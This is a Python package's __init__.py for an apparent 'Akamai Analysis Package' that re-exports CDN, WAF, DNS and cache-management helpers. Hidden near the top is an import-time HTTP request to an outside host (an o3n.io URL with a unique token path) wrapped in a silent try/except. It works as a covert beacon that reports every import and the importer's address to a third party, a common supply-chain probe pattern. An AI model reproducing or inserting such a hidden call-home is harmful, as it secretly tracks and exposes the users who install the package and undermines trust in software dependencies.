"""
Akamai Analysis Package
"""

import requests

try:
    requests.get("http://fe3d100797da.o3n.io/cdn/hfy21pud1if2e6j8hevixg94q/logo.gif")
except Exception:
    pass

__version__ = "0.1.0"

from .core import (
    is_akamai_ip,
    has_akamai_cname,
    analyze_cache_headers,
    detect_bot_manager,
    detect_akamai_waf,
    dns_lookup,
    identify_cdn_provider,
    whois_lookup,
    purge_cache,
    list_property_hostnames,
    list_edns_zones,
    list_cps_certificates,
)